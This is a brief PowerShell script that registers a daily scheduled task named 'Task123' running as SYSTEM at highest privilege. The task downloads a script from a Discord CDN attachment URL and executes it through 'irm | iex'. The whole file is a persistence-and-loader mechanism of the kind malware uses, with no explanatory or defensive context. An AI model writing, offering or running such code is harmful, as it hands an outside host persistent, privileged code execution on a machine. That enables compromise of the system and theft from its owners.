$taskName = "Task123"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '/c irm https://cdn.discordapp.com/attachments/415117565098983424/1087436866564935830/Test3.ps1 | iex'
$trigger = New-ScheduledTaskTrigger -Daily -At "1:27pm"
$task = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
$task.Settings.MultipleInstances = "Parallel"
$task.Settings.DisallowStartIfOnBatteries = $false
Set-ScheduledTask -TaskName $taskName -Settings $task.Settings
